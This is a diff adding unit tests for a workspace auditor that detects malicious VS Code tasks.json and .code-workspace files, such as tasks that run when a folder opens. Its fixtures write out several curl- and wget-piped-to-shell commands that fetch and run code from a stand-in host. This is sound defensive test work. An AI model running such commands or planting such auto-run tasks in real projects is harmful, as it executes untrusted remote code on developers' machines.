@@ -547,3 +547,113 @@ describe('parseJsonc', () => {
     assert.equal(parseJsonc('{not json}'), null)
   })
 })
+
+describe('auditWorkspace — tasks.json shapes used by real campaigns', () => {
+  const folderOpen = { runOptions: { runOn: 'folderOpen' } }
+
+  it('classifies OS-specific commands (osx / linux / windows overrides)', () => {
+    withRepo(dir => {
+      mkdirSync(join(dir, '.vscode'))
+      writeFileSync(join(dir, '.vscode', 'tasks.json'), JSON.stringify({
+        version: '2.0.0',
+        tasks: [{
+          label: 'env',
+          type: 'shell',
+          osx: { command: "curl -s 'https://x.example/m' | bash" },
+          linux: { command: "wget -qO- 'https://x.example/l' | sh" },
+          windows: { command: 'curl https://x.example/w | cmd' },
+          ...folderOpen,
+        }],
+      }))
+    }, dir => {
+      const r = auditWorkspace(dir)
+      assert.equal(r.summary.high, 3)
+      assert.ok(r.findings.some(f => f.trigger.includes('windows command')))
+    })
+  })
+
+  it('reads { value } command objects', () => {
+    withRepo(dir => {
+      mkdirSync(join(dir, '.vscode'))
+      writeFileSync(join(dir, '.vscode', 'tasks.json'), JSON.stringify({
+        tasks: [{ label: 't', command: { value: 'curl https://x.example/p | sh', quoting: 'weak' }, ...folderOpen }],
+      }))
+    }, dir => {
+      assert.equal(auditWorkspace(dir).summary.high, 1)
+    })
+  })
+
+  it('follows dependsOn from a folderOpen task to the task that does the work', () => {
+    withRepo(dir => {
+      mkdirSync(join(dir, '.vscode'))
+      writeFileSync(join(dir, '.vscode', 'tasks.json'), JSON.stringify({
+        tasks: [
+          { label: 'setup', dependsOn: ['payload'], ...folderOpen },
+          { label: 'payload', command: 'curl https://x.example/p | bash' },
+        ],
+      }))
+    }, dir => {
+      const r = auditWorkspace(dir)
+      assert.equal(r.summary.high, 1)
+      assert.ok(r.findings[0].trigger.includes('dependsOn "payload"'))
+    })
+  })
+
+  it('does not loop on circular dependsOn', () => {
+    withRepo(dir => {
+      mkdirSync(join(dir, '.vscode'))
+      writeFileSync(join(dir, '.vscode', 'tasks.json'), JSON.stringify({
+        tasks: [
+          { label: 'a', dependsOn: 'b', command: 'npm run watch', ...folderOpen },
+          { label: 'b', dependsOn: 'a', command: 'npm run lint' },
+        ],
+      }))
+    }, dir => {
+      const r = auditWorkspace(dir)
+      assert.equal(r.summary.high, 0)
+      assert.equal(r.findings.length, 2)
+    })
+  })
+
+  it('reports a folderOpen task whose command cannot be read as INFO, not silence', () => {
+    withRepo(dir => {
+      mkdirSync(join(dir, '.vscode'))
+      writeFileSync(join(dir, '.vscode', 'tasks.json'), JSON.stringify({ tasks: [{ label: 'x', ...folderOpen }] }))
+    }, dir => {
+      const r = auditWorkspace(dir)
+      assert.equal(r.findings.length, 1)
+      assert.equal(r.findings[0].severity, 'INFO')
+    })
+  })
+})
+
+describe('auditWorkspace — *.code-workspace files', () => {
+  it('scans tasks and settings carried by a workspace file', () => {
+    withRepo(dir => {
+      writeFileSync(join(dir, 'project.code-workspace'), `{
+        // multi-root workspace
+        "folders": [{ "path": "." }],
+        "tasks": { "version": "2.0.0", "tasks": [{ "label": "x", "command": "wget -qO- https://x.example/p | sh", "runOptions": { "runOn": "folderOpen" } }] },
+        "settings": { "terminal.integrated.automationProfile.osx": { "path": "./scripts/run.sh" } },
+      }`)
+    }, dir => {
+      const r = auditWorkspace(dir)
+      assert.ok(r.surfacesChecked.includes('project.code-workspace'))
+      assert.equal(r.summary.high, 1)
+      assert.ok(r.findings.some(f => f.source === 'vscode-settings' && f.file === 'project.code-workspace'))
+    })
+  })
+
+  it('keeps a benign folderOpen task in a workspace file at INFO (FP policy)', () => {
+    withRepo(dir => {
+      writeFileSync(join(dir, 'app.code-workspace'), JSON.stringify({
+        folders: [{ path: '.' }],
+        tasks: { tasks: [{ label: 'watch', type: 'npm', script: 'watch', runOptions: { runOn: 'folderOpen' } }] },
+      }))
+    }, dir => {
+      const r = auditWorkspace(dir)
+      assert.equal(r.findings.length, 1)
+      assert.equal(r.findings[0].severity, 'INFO')
+    })
+  })
+})
